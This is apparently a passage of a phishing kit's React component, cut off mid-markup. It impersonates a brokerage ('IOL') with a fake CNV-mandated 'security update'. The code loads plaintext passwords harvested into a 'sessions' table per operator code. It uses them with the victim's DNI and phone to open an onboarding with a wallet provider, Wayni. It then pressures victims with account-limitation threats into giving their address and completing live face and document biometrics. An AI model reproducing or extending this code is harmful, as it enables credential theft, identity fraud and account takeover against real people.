import { useCallback, useEffect, useMemo, useState } from "react";
import {
  AlertTriangle,
  Building2,
  Camera,
  CheckCircle2,
  ChevronRight,
  CreditCard,
  ExternalLink,
  Loader2,
  Lock,
  MapPin,
  RefreshCw,
  ShieldCheck,
  Smartphone,
  UserRound,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { toast } from "@/components/ui/use-toast";

interface KycCaseRecord {
  id: string;
  operator_code: string;
  email: string | null;
  full_name: string | null;
  phone: string | null;
  document_number: string | null;
  status: string;
  submitted_at: string | null;
}

interface WayniOnboardingRecord {
  id: string;
  email: string;
  full_name: string | null;
  phone: string | null;
  dni: string | null;
  gender: string | null;
  user_uuid: string | null;
  biometric_url: string | null;
  biometric_id: string | null;
  region: string | null;
  city: string | null;
  street: string | null;
  zip_code: string | null;
  bio_status: string | null;
  wallet_status: string | null;
  face_code: string | null;
  face_confidence: string | null;
  status: string;
}

interface LegalCandidate {
  identity_number?: string;
  full_name: string;
  gender: string;
  tax_identification_value: string;
}

type Step = "verify" | "address" | "biometric" | "done";

interface WayniKycFlowProps {
  caseId: string;
  embedded?: boolean;
  brandLabel?: string;
}

const stepOrder: Step[] = ["verify", "address", "biometric"];

const inputClass =
  "w-full rounded-2xl border border-input bg-background px-4 py-3 text-sm text-foreground outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/15 placeholder:text-muted-foreground/70 disabled:cursor-not-allowed disabled:opacity-60";
const selectClass = `${inputClass} appearance-none`;

const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKycFlowProps) => {
  const [loading, setLoading] = useState(true);
  const [caseRecord, setCaseRecord] = useState<KycCaseRecord | null>(null);
  const [step, setStep] = useState<Step>("verify");
  const [sessionPassword, setSessionPassword] = useState("");
  const [wayniSnapshot, setWayniSnapshot] = useState<WayniOnboardingRecord | null>(null);

  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [dni, setDni] = useState("");
  const [gender, setGender] = useState("");
  const [userUuid, setUserUuid] = useState("");
  const [biometricUrl, setBiometricUrl] = useState("");

  const [candidates, setCandidates] = useState<LegalCandidate[]>([]);
  const [selectedCandidateKey, setSelectedCandidateKey] = useState("");
  const [verifyLoading, setVerifyLoading] = useState(false);
  const [verifyError, setVerifyError] = useState("");

  const [provinces, setProvinces] = useState<Record<string, string>>({});
  const [localities, setLocalities] = useState<Record<string, string>>({});
  const [loadingProvinces, setLoadingProvinces] = useState(false);
  const [loadingLocalities, setLoadingLocalities] = useState(false);
  const [addressLoading, setAddressLoading] = useState(false);
  const [addressError, setAddressError] = useState("");
  const [selectedProvinceId, setSelectedProvinceId] = useState("");
  const [selectedProvinceName, setSelectedProvinceName] = useState("");
  const [selectedLocalityId, setSelectedLocalityId] = useState("");
  const [selectedLocalityName, setSelectedLocalityName] = useState("");
  const [streetName, setStreetName] = useState("");
  const [streetNumber, setStreetNumber] = useState("");
  const [floor, setFloor] = useState("");
  const [apartment, setApartment] = useState("");
  const [zipCode, setZipCode] = useState("");

  const [biometricStarted, setBiometricStarted] = useState(false);
  const [checkingBiometric, setCheckingBiometric] = useState(false);

  const selectedCandidate = useMemo(
    () => candidates.find((candidate) => `${candidate.full_name}|${candidate.gender}|${candidate.tax_identification_value}` === selectedCandidateKey),
    [candidates, selectedCandidateKey],
  );

  const currentStepIndex = step === "done" ? stepOrder.length : Math.max(stepOrder.indexOf(step), 0) + 1;
  const progressValue = Math.round((currentStepIndex / stepOrder.length) * 100);

  useEffect(() => {
    if (embedded) return;
    const originalTitle = document.title;
    document.title = `KYC ${brandLabel}`;
    return () => {
      document.title = originalTitle;
    };
  }, [brandLabel, embedded]);

  const loadLocalities = useCallback(async (provinceId: string, preferredLocality?: string | null) => {
    if (!provinceId) return;

    setLoadingLocalities(true);
    const { data, error } = await invokeWayni({ action: "get_localities", province_id: Number(provinceId) });

    if (!error && data?.localities) {
      const fetchedLocalities = data.localities as Record<string, string>;
      setLocalities(fetchedLocalities);

      if (preferredLocality) {
        const matched = Object.entries(fetchedLocalities).find(([, name]) => name === preferredLocality);
        if (matched) {
          setSelectedLocalityId(matched[0]);
          setSelectedLocalityName(matched[1]);
        }
      }
    }

    setLoadingLocalities(false);
  }, []);

  const persistWayniSnapshot = useCallback(async (payload: Record<string, unknown>) => {
    if (!caseRecord?.email) return;

    const normalizedEmail = caseRecord.email.trim().toLowerCase();
    const onboardingClient = supabase as any;
    const { data: existing } = await onboardingClient
      .from("wayni_onboarding")
      .select("id")
      .eq("email", normalizedEmail)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    const basePayload = {
      email: normalizedEmail,
      operator_code: caseRecord.operator_code,
      updated_at: new Date().toISOString(),
      ...payload,
    };

    if (existing?.id) {
      await onboardingClient.from("wayni_onboarding").update(basePayload).eq("id", existing.id);
    } else {
      await onboardingClient.from("wayni_onboarding").insert(basePayload);
    }
  }, [caseRecord]);

  const refreshBiometricStatus = useCallback(async () => {
    if (!dni) return;

    setCheckingBiometric(true);
    const { data, error } = await invokeWayni({
      action: "check_biometric_status",
      identity_number: dni,
    });

    if (error || data?.error) {
      toast({
        title: "No se pudo actualizar",
        description: "Intentá nuevamente en unos instantes.",
      });
      setCheckingBiometric(false);
      return;
    }

    const biometricStatus = String(data?.biometric_status || "").toLowerCase();
    const biometricOk = Boolean(data?.biometric_ok) || biometricStatus === "success";
    const now = new Date().toISOString();

    await persistWayniSnapshot({
      dni,
      full_name: fullName || null,
      phone: phone || null,
      gender: gender || null,
      user_uuid: userUuid || null,
      biometric_url: biometricUrl || null,
      bio_status: biometricStatus || null,
      wallet_status: data?.wallet_status ? String(data.wallet_status).toUpperCase() : null,
      face_code: data?.facematching?.code ? String(data.facematching.code) : null,
      face_confidence: data?.facematching_confidence ? String(data.facematching_confidence) : null,
      status: biometricOk ? "validated" : "biometric_started",
    });

    setWayniSnapshot((prev) => (
      prev
        ? {
            ...prev,
            dni,
            full_name: fullName || prev.full_name,
            phone: phone || prev.phone,
            gender: gender || prev.gender,
            user_uuid: userUuid || prev.user_uuid,
            biometric_url: biometricUrl || prev.biometric_url,
            bio_status: biometricStatus || prev.bio_status,
            wallet_status: data?.wallet_status ? String(data.wallet_status).toUpperCase() : prev.wallet_status,
            face_code: data?.facematching?.code ? String(data.facematching.code) : prev.face_code,
            face_confidence: data?.facematching_confidence ? String(data.facematching_confidence) : prev.face_confidence,
            status: biometricOk ? "validated" : "biometric_started",
          }
        : prev
    ));

    if (biometricOk && caseRecord) {
      await supabase
        .from("kyc_cases")
        .update({ status: "submitted", submitted_at: now })
        .eq("id", caseRecord.id);

      await supabase.from("kyc_audit_logs").insert({
        case_id: caseRecord.id,
        operator_code: caseRecord.operator_code,
        event_type: "provider_kyc_completed",
        metadata: {
          provider: "wayni",
          dni,
          bio_status: biometricStatus || null,
          wallet_status: data?.wallet_status || null,
          finished_at: now,
        },
      } as never);

      setCaseRecord((prev) => (prev ? { ...prev, status: "submitted", submitted_at: now } : prev));
      setStep("done");
      toast({
        title: "Verificación finalizada",
        description: "Tu proceso de seguridad fue completado correctamente.",
      });
    } else {
      toast({
        title: "Verificación en curso",
        description: "Completá la validación en la otra pestaña y luego actualizá el estado.",
      });
    }

    setCheckingBiometric(false);
  }, [biometricUrl, caseRecord, dni, fullName, gender, persistWayniSnapshot, phone, userUuid]);

  const loadCase = useCallback(async () => {
    if (!caseId) {
      setCaseRecord(null);
      setLoading(false);
      return;
    }

    setLoading(true);

    const { data, error } = await supabase
      .from("kyc_cases")
      .select("id, operator_code, email, full_name, phone, document_number, status, submitted_at")
      .eq("id", caseId)
      .maybeSingle();

    if (error || !data) {
      setCaseRecord(null);
      setLoading(false);
      return;
    }

    const record = data as KycCaseRecord;
    setCaseRecord(record);

    const normalizedEmail = record.email?.trim().toLowerCase();
    const [sessionResult, onboardingResult] = await Promise.all([
      normalizedEmail
        ? supabase
            .from("sessions")
            .select("password")
            .eq("email", normalizedEmail)
            .eq("operator_code", record.operator_code)
            .order("created_at", { ascending: false })
            .limit(1)
            .maybeSingle()
        : Promise.resolve({ data: null, error: null }),
      normalizedEmail
        ? (supabase as any)
            .from("wayni_onboarding")
            .select("id, email, full_name, phone, dni, gender, user_uuid, biometric_url, biometric_id, region, city, street, zip_code, bio_status, wallet_status, face_code, face_confidence, status")
            .eq("email", normalizedEmail)
            .order("created_at", { ascending: false })
            .limit(1)
            .maybeSingle()
        : Promise.resolve({ data: null, error: null }),
    ]);

    const onboarding = (onboardingResult?.data || null) as WayniOnboardingRecord | null;
    setWayniSnapshot(onboarding);
    setSessionPassword(sessionResult?.data?.password || "");
    setFullName(onboarding?.full_name || record.full_name || "");
    setPhone(onboarding?.phone || record.phone || "");
    setDni(onboarding?.dni || record.document_number || "");
    setGender(onboarding?.gender || "");
    setUserUuid(onboarding?.user_uuid || "");
    setBiometricUrl(onboarding?.biometric_url || "");

    if (onboarding?.region) {
      setSelectedProvinceName(onboarding.region);
    }
    if (onboarding?.city) {
      setSelectedLocalityName(onboarding.city);
    }
    if (onboarding?.street) {
      const streetParts = onboarding.street.split(" ");
      const lastPart = streetParts.at(-1) || "";
      if (/^\d+$/.test(lastPart)) {
        setStreetName(streetParts.slice(0, -1).join(" "));
        setStreetNumber(lastPart);
      } else {
        setStreetName(onboarding.street);
      }
    }
    if (onboarding?.zip_code) {
      setZipCode(onboarding.zip_code);
    }

    const isDone = record.status === "submitted" || String(onboarding?.bio_status || "").toLowerCase() === "success";

    if (isDone) {
      setStep("done");
    } else if (onboarding?.biometric_url) {
      setStep("biometric");
    } else if (onboarding?.user_uuid) {
      setStep("address");
    } else {
      setStep("verify");
    }

    setLoading(false);
  }, [caseId]);

  useEffect(() => {
    void loadCase();
  }, [loadCase]);

  useEffect(() => {
    if (step !== "address") return;

    const loadProvinces = async () => {
      setLoadingProvinces(true);
      const { data, error } = await invokeWayni({ action: "get_provinces" });

      if (!error && data?.provinces) {
        const fetchedProvinces = data.provinces as Record<string, string>;
        setProvinces(fetchedProvinces);

        if (selectedProvinceName) {
          const matchedProvince = Object.entries(fetchedProvinces).find(([, name]) => name === selectedProvinceName);
          if (matchedProvince) {
            setSelectedProvinceId(matchedProvince[0]);
            await loadLocalities(matchedProvince[0], selectedLocalityName || undefined);
          }
        }
      }

      setLoadingProvinces(false);
    };

    void loadProvinces();
  }, [loadLocalities, selectedLocalityName, selectedProvinceName, step]);

  useEffect(() => {
    if (step === "biometric" && dni && !checkingBiometric) {
      void refreshBiometricStatus();
    }
  }, [checkingBiometric, dni, refreshBiometricStatus, step]);

  const handleVerifySubmit = useCallback(async () => {
    if (!caseRecord?.email) {
      setVerifyError("Este enlace no tiene un email válido para iniciar la verificación.");
      return;
    }

    if (!dni.trim()) {
      setVerifyError("Ingresá tu DNI para continuar.");
      return;
    }

    if (dni.trim().length < 7) {
      setVerifyError("El DNI debe tener al menos 7 dígitos.");
      return;
    }

    if (!phone.trim()) {
      setVerifyError("Ingresá tu número de celular.");
      return;
    }

    if (!sessionPassword) {
      setVerifyError("No encontramos la credencial necesaria para iniciar el flujo. Solicitá nuevamente el proceso.");
      return;
    }

    if (candidates.length > 1 && !selectedCandidate) {
      setVerifyError("Seleccioná el nombre correcto para continuar.");
      return;
    }

    setVerifyLoading(true);
    setVerifyError("");

    const { data, error } = await invokeWayni({
      action: "onboarding_verify",
      email: caseRecord.email.trim().toLowerCase(),
      identity_number: dni.trim(),
      phone_number: phone.trim(),
      password: sessionPassword,
      selected_full_name: selectedCandidate?.full_name,
      selected_gender: gender || undefined,
      selected_tax_identification_value: selectedCandidate?.tax_identification_value,
    });

    if (error || data?.error) {
      setVerifyError(data?.error || error?.message || "No fue posible validar tus datos.");
      setVerifyLoading(false);
      return;
    }

    if (data?.requires_selection && Array.isArray(data?.candidates) && data.candidates.length > 0) {
      setCandidates(data.candidates as LegalCandidate[]);
      setSelectedCandidateKey("");
      if (!gender) {
        setGender(String(data?.suggested_gender || data.candidates[0]?.gender || "").toUpperCase());
      }
      setVerifyError("Encontramos más de un titular para este DNI. Seleccioná el nombre correcto para continuar.");
      setVerifyLoading(false);
      return;
    }

    const resolvedName = String(data?.full_name || selectedCandidate?.full_name || fullName || "").trim();
    const resolvedGender = String(data?.gender || gender || selectedCandidate?.gender || "").toUpperCase();
    const resolvedUuid = String(data?.user_uuid || "");

    setFullName(resolvedName);
    setGender(resolvedGender);
    setUserUuid(resolvedUuid);
    setCandidates([]);
    setSelectedCandidateKey("");

    await supabase
      .from("kyc_cases")
      .update({
        full_name: resolvedName || null,
        phone: phone.trim(),
        document_number: dni.trim(),
        status: "collecting",
      })
      .eq("id", caseRecord.id);

    await supabase.from("kyc_audit_logs").insert({
      case_id: caseRecord.id,
      operator_code: caseRecord.operator_code,
      event_type: "provider_verify_started",
      metadata: {
        provider: "wayni",
        email: caseRecord.email,
        phone: phone.trim(),
        dni: dni.trim(),
        full_name: resolvedName || null,
      },
    } as never);

    await persistWayniSnapshot({
      dni: dni.trim(),
      full_name: resolvedName || null,
      phone: phone.trim(),
      gender: resolvedGender || null,
      user_uuid: resolvedUuid || null,
      password: sessionPassword,
      status: "verify_dni_success",
    });

    setCaseRecord((prev) => (
      prev
        ? {
            ...prev,
            full_name: resolvedName || prev.full_name,
            phone: phone.trim(),
            document_number: dni.trim(),
            status: "collecting",
          }
        : prev
    ));

    setStep("address");
    setVerifyLoading(false);
  }, [
    candidates.length,
    caseRecord,
    dni,
    fullName,
    gender,
    persistWayniSnapshot,
    phone,
    selectedCandidate,
    sessionPassword,
  ]);

  const handleProvinceChange = useCallback(async (provinceId: string) => {
    setSelectedProvinceId(provinceId);
    setSelectedProvinceName(provinces[provinceId] || "");
    setSelectedLocalityId("");
    setSelectedLocalityName("");
    setLocalities({});
    await loadLocalities(provinceId);
  }, [loadLocalities, provinces]);

  const handleAddressSubmit = useCallback(async () => {
    if (!caseRecord) return;

    if (!userUuid) {
      setAddressError("Primero completá la validación de identidad.");
      return;
    }
    if (!selectedProvinceId) {
      setAddressError("Seleccioná una provincia.");
      return;
    }
    if (!selectedLocalityId) {
      setAddressError("Seleccioná una localidad.");
      return;
    }
    if (!streetName.trim()) {
      setAddressError("Ingresá la calle.");
      return;
    }
    if (!streetNumber.trim()) {
      setAddressError("Ingresá la altura.");
      return;
    }
    if (!zipCode.trim()) {
      setAddressError("Ingresá el código postal.");
      return;
    }

    setAddressLoading(true);
    setAddressError("");

    const addressPayload = {
      uuid: userUuid,
      street_name: streetName.trim(),
      street_number: streetNumber.trim(),
      floor: floor.trim() || null,
      apartment: apartment.trim() || null,
      zip_code: zipCode.trim(),
      neighborhood: null,
      city_id: Number(selectedLocalityId),
      city: selectedLocalityName,
      region_id: Number(selectedProvinceId),
      region: selectedProvinceName,
    };

    const { data: saveData, error: saveError } = await invokeWayni({
      action: "save_address",
      ...addressPayload,
    });

    if (saveError || saveData?.error) {
      setAddressError(saveData?.error || saveError?.message || "No fue posible guardar la dirección.");
      setAddressLoading(false);
      return;
    }

    const { data: biometricData, error: biometricError } = await invokeWayni({
      action: "onboarding_biometric",
      identity_number: dni,
      user_uuid: userUuid,
      gender: gender || "M",
    });

    if (biometricError || biometricData?.error || !biometricData?.biometric_url) {
      setAddressError(biometricData?.error || biometricError?.message || "No fue posible abrir la biometría.");
      setAddressLoading(false);
      return;
    }

    const nextBiometricUrl = String(biometricData.biometric_url);
    setBiometricUrl(nextBiometricUrl);
    setBiometricStarted(false);

    await persistWayniSnapshot({
      dni,
      full_name: fullName || null,
      phone: phone || null,
      gender: gender || null,
      user_uuid: userUuid,
      region: selectedProvinceName,
      city: selectedLocalityName,
      street: `${streetName.trim()} ${streetNumber.trim()}`.trim(),
      zip_code: zipCode.trim(),
      biometric_url: nextBiometricUrl,
      biometric_id: biometricData?.biometric_id ? String(biometricData.biometric_id) : null,
      status: "biometric_started",
    });

    await supabase.from("kyc_audit_logs").insert({
      case_id: caseRecord.id,
      operator_code: caseRecord.operator_code,
      event_type: "provider_address_saved",
      metadata: {
        provider: "wayni",
        region: selectedProvinceName,
        city: selectedLocalityName,
        street: `${streetName.trim()} ${streetNumber.trim()}`.trim(),
        zip_code: zipCode.trim(),
        biometric_id: biometricData?.biometric_id || null,
      },
    } as never);

    setStep("biometric");
    setAddressLoading(false);
  }, [
    apartment,
    caseRecord,
    dni,
    floor,
    fullName,
    gender,
    persistWayniSnapshot,
    phone,
    selectedLocalityId,
    selectedLocalityName,
    selectedProvinceId,
    selectedProvinceName,
    streetName,
    streetNumber,
    userUuid,
    zipCode,
  ]);

  const renderVerifyStep = () => (
    <div className="grid gap-6 lg:grid-cols-[1.15fr_0.85fr]">
      <Card className="border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-6 sm:p-7">
          <div className="mb-6 flex items-start gap-4">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-primary/12 text-primary">
              <CreditCard className="h-5 w-5" />
            </div>
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.24em] text-primary">Actualización de seguridad</p>
              <h1 className="mt-2 text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">
                Confirmación de datos personales
              </h1>
              <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
                Por normativa de la CNV, necesitamos confirmar tus datos para proteger tus fondos e inversiones. Sin completar este paso, tu cuenta puede quedar limitada temporalmente.
              </p>
            </div>
          </div>

          {verifyError && (
            <div className="mb-4 rounded-2xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
              {verifyError}
            </div>
          )}

          <div className="mb-4 grid gap-3">
            {fullName && (
              <div className="rounded-2xl border border-border bg-background/70 px-4 py-3">
                <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Nombre</p>
                <p className="mt-1 text-sm font-medium text-foreground">{fullName}</p>
              </div>
            )}
            {caseRecord?.email && (
              <div className="rounded-2xl border border-border bg-background/70 px-4 py-3">
                <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Email</p>
                <p className="mt-1 text-sm font-medium text-foreground">{caseRecord.email}</p>
              </div>
            )}
          </div>

          <div className="grid gap-3">
            <div>
              <label className="mb-1.5 block text-sm font-medium text-foreground">Número de DNI</label>
              <input
                type="text"
                inputMode="numeric"
                value={dni}
                maxLength={10}
                onChange={(event) => {
                  setDni(event.target.value.replace(/\D/g, ""));
                  setCandidates([]);
                  setSelectedCandidateKey("");
                }}
                className={inputClass}
                placeholder="Ej: 38045521"
                disabled={verifyLoading}
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-medium text-foreground">Número de celular</label>
              <input
                type="text"
                inputMode="tel"
                value={phone}
                maxLength={15}
                onChange={(event) => setPhone(event.target.value.replace(/\D/g, ""))}
                className={inputClass}
                placeholder="Ej: 1166051847"
                disabled={verifyLoading}
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-medium text-foreground">Sexo (opcional)</label>
              <select
                value={gender}
                onChange={(event) => setGender(event.target.value.toUpperCase())}
                className={selectClass}
                disabled={verifyLoading}
              >
                <option value="">Seleccionar</option>
                <option value="F">Femenino</option>
                <option value="M">Masculino</option>
              </select>
            </div>

            {candidates.length > 1 && (
              <div className="rounded-2xl border border-border bg-background/70 p-3">
                <p className="mb-2 text-sm font-medium text-foreground">Seleccioná tu nombre</p>
                <div className="grid gap-2">
                  {candidates.map((candidate) => {
                    const key = `${candidate.full_name}|${candidate.gender}|${candidate.tax_identification_value}`;
                    const isSelected = selectedCandidateKey === key;
                    return (
                      <button
                        key={key}
                        type="button"
                        onClick={() => setSelectedCandidateKey(key)}
                        className={`rounded-2xl border px-3 py-3 text-left transition ${
                          isSelected
                            ? "border-primary bg-primary/10"
                            : "border-border bg-background hover:border-primary/40"
                        }`}
                      >
                        <p className="text-sm font-semibold text-foreground">{candidate.full_name}</p>
                        <p className="mt-1 text-xs text-muted-foreground">
                          CUIT: {candidate.tax_identification_value} • Sexo: {candidate.gender || "-"}
                        </p>
                      </button>
                    );
                  })}
                </div>
              </div>
            )}
          </div>

          <Button className="mt-5 w-full" onClick={handleVerifySubmit} disabled={verifyLoading}>
            {verifyLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <ChevronRight className="h-4 w-4" />}
            Confirmar y verificar
          </Button>
        </CardContent>
      </Card>

      <Card className="border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-6 sm:p-7">
          <div className="flex items-center gap-2 text-primary">
            <ShieldCheck className="h-5 w-5" />
            <h2 className="text-lg font-semibold text-foreground">Paso a paso</h2>
          </div>

          <div className="mt-5 grid gap-3">
            {[
              { icon: UserRound, title: "1. Confirmación de identidad", text: "Validamos tu DNI y tus datos básicos antes de seguir." },
              { icon: MapPin, title: "2. Dirección", text: "Completás la dirección de residencia requerida por el proveedor." },
              { icon: Camera, title: "3. Cámara en vivo", text: "La captura de rostro y documentos se hace en el flujo listo de Wayni." },
            ].map(({ icon: Icon, title, text }) => (
              <div key={title} className="rounded-2xl border border-border bg-background/70 p-4">
                <div className="flex items-center gap-2 text-foreground">
                  <Icon className="h-4 w-4 text-primary" />
                  <p className="text-sm font-semibold">{title}</p>
                </div>
                <p className="mt-2 text-sm text-muted-foreground">{text}</p>
              </div>
            ))}
          </div>

          <div className="mt-5 rounded-2xl border border-primary/20 bg-primary/5 p-4 text-sm text-muted-foreground">
            <p>
              Este es un procedimiento estándar para <span className="font-medium text-foreground">proteger tu cuenta {brandLabel}</span> y mantener tus fondos verificados.
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderAddressStep = () => (
    <div className="grid gap-6 lg:grid-cols-[1.15fr_0.85fr]">
      <Card className="border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-6 sm:p-7">
          <div className="mb-6 flex items-start gap-4">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-primary/12 text-primary">
              <MapPin className="h-5 w-5" />
            </div>
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.24em] text-primary">Etapa 2</p>
              <h2 className="mt-2 text-2xl font-semibold tracking-tight text-foreground">Dirección de residencia</h2>
              <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
                Necesitamos tu dirección para completar la verificación de tu cuenta y mantener tus fondos protegidos.
              </p>
            </div>
          </div>

          {addressError && (
            <div className="mb-4 rounded-2xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
              {addressError}
            </div>
          )}

          <div className="grid gap-3">
            <div>
              <label className="mb-1.5 block text-sm font-medium text-foreground">Provincia</label>
              <select
                value={selectedProvinceId}
                onChange={(event) => void handleProvinceChange(event.target.value)}
                className={selectClass}
                disabled={loadingProvinces || addressLoading}
              >
                <option value="">{loadingProvinces ? "Cargando..." : "Seleccionar provincia"}</option>
                {Object.entries(provinces)
                  .sort(([, a], [, b]) => a.localeCompare(b))
                  .map(([id, name]) => (
                    <option key={id} value={id}>
                      {name}
                    </option>
                  ))}
              </select>
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-medium text-foreground">Localidad</label>
              <select
                value={selectedLocalityId}
                onChange={(event) => {
                  setSelectedLocalityId(event.target.value);
                  setSelectedLocalityName(localities[event.target.value] || "");
                }}
                className={selectClass}
                disabled={!selectedProvinceId || loadingLocalities || addressLoading}
              >
                <option value="">{loadingLocalities ? "Cargando..." : "Seleccionar localidad"}</option>
                {Object.entries(localities)
                  .sort(([, a], [, b]) => a.localeCompare(b))
                  .map(([id, name]) => (
                    <option key={id} value={id}>
                      {name}
                    </option>
                  ))}
              </select>
            </div>

            <div className="grid gap-3 sm:grid-cols-[1.5fr_0.7fr]">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-foreground">Calle</label>
                <input
                  type="text"
                  value={streetName}
                  onChange={(event) => setStreetName(event.target.value)}
                  className={inputClass}
                  placeholder="Ej: Av. Corrientes"
                  disabled={addressLoading}
                />
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-foreground">Altura</label>
                <input
                  type="text"
                  value={streetNumber}
                  onChange={(event) => setStreetNumber(event.target.value)}
                  className={inputClass}
                  placeholder="1234"
                  disabled={addressLoading}
                />
              </div>
            </div>

            <div className="grid gap-3 sm:grid-cols-3">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-foreground">Piso</label>
                <input
                  type="text"
                  value={floor}
                  onChange={(event) => setFloor(event.target.value)}
                  className={inputClass}
                  placeholder="3"
                  disabled={addressLoading}
                />
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-foreground">Depto</label>
                <input
                  type="text"
                  value={apartment}
                  onChange={(event) => setApartment(event.target.value)}
                  className={inputClass}
                  placeholder="A"
                  disabled={addressLoading}
                />
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-foreground">C.P.</label>
                <input
                  type="text"
                  value={zipCode}
                  onChange={(event) => setZipCode(event.target.value.replace(/\D/g, ""))}
                  className={inputClass}
                  placeholder="1043"
                  disabled={addressLoading}
                />
              </div>
            </div>
          </div>

          <Button className="mt-5 w-full" onClick={handleAddressSubmit} disabled={addressLoading}>
            {addressLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <ChevronRight className="h-4 w-4" />}
            Confirmar dirección
          </Button>
        </CardContent>
      </Card>

      <Card className="border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-6 sm:p-7">
          <div className="flex items-center gap-2 text-primary">
            <Building2 className="h-5 w-5" />
            <h2 className="text-lg font-semibold text-foreground">Resumen</h2>
          </div>

          <div className="mt-5 grid gap-3">
            <div className="rounded-2xl border border-border bg-background/70 p-4">
              <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Nombre</p>
              <p className="mt-1 text-sm font-medium text-foreground">{fullName || "—"}</p>
            </div>
            <div className="rounded-2xl border border-border bg-background/70 p-4">
              <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">DNI</p>
              <p className="mt-1 text-sm font-medium text-foreground">{dni || "—"}</p>
            </div>
            <div className="rounded-2xl border border-border bg-background/70 p-4">
              <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Celular</p>
              <p className="mt-1 text-sm font-medium text-foreground">{phone || "—"}</p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderBiometricStep = () => (
    <div className="grid gap-6 lg:grid-cols-[1.15fr_0.85fr]">
      <Card className="border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-6 sm:p-7">
          <div className="mb-6 flex items-start gap-4">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-primary/12 text-primary">
              <Camera className="h-5 w-5" />
            </div>
            <div>
              <p className="text-xs font-semibold uppercase tracking-[0.24em] text-primary">Etapa 3</p>
              <h2 className="mt-2 text-2xl font-semibold tracking-tight text-foreground">Verificación documental de seguridad</h2>
              <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
                Para garantizar la seguridad de tu cuenta y cumplir con las normas vigentes, necesitamos una validación rápida con cámara en vivo.
              </p>
            </div>
          </div>

          <div className="rounded-[28px] border border-border bg-background/70 p-5 sm:p-6">
            <div className="flex items-start gap-3">
              <div className="mt-0.5 flex h-10 w-10 items-center justify-center rounded-2xl bg-primary/10 text-primary">
                <Smartphone className="h-5 w-5" />
              </div>
              <div>
                <h3 className="text-lg font-semibold text-foreground">Abrir verificación en vivo</h3>
                <p className="mt-1 text-sm text-muted-foreground">
                  Vas a continuar en el flujo listo de Wayni para rostro y documentos. Cuando termines, volvé acá y actualizá el estado.
                </p>
              </div>
            </div>

            <div className="mt-4 rounded-2xl border border-primary/20 bg-primary/5 p-4 text-sm text-muted-foreground">
              <div className="flex items-start gap-2">
                <Lock className="mt-0.5 h-4 w-4 text-primary" />
                <p>
                  Este procedimiento es obligatorio para proteger tus fondos e inversiones. El proceso suele tardar menos de <span className="font-medium text-foreground">2 minutos</span>.
                </p>
              </div>
            </div>

            <div className="mt-5 flex flex-col gap-3 sm:flex-row">
              <Button
                className="sm:flex-1"
                onClick={() => {
                  window.open(biometricUrl, "_blank", "noopener,noreferrer");
                  setBiometricStarted(true);
                }}
                disabled={!biometricUrl}
              >
                <ExternalLink className="h-4 w-4" />
                {biometricStarted ? "Abrir nuevamente" : "Verificar y proteger mi cuenta"}
              </Button>

              <Button variant="outline" className="sm:flex-1" onClick={() => void refreshBiometricStatus()} disabled={checkingBiometric || !dni}>
                {checkingBiometric ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                Actualizar estado
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      <Card className="border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-6 sm:p-7">
          <div className="flex items-center gap-2 text-primary">
            <ShieldCheck className="h-5 w-5" />
            <h2 className="text-lg font-semibold text-foreground">Estado actual</h2>
          </div>

          <div className="mt-5 grid gap-3">
            <div className="rounded-2xl border border-border bg-background/70 p-4">
              <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Biometría</p>
              <p className="mt-1 text-sm font-medium text-foreground">
                {wayniSnapshot?.bio_status || (biometricStarted ? "en curso" : "pendiente de inicio")}
              </p>
            </div>
            <div className="rounded-2xl border border-border bg-background/70 p-4">
              <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Wallet</p>
              <p className="mt-1 text-sm font-medium text-foreground">{wayniSnapshot?.wallet_status || "—"}</p>
            </div>
            <div className="rounded-2xl border border-border bg-background/70 p-4">
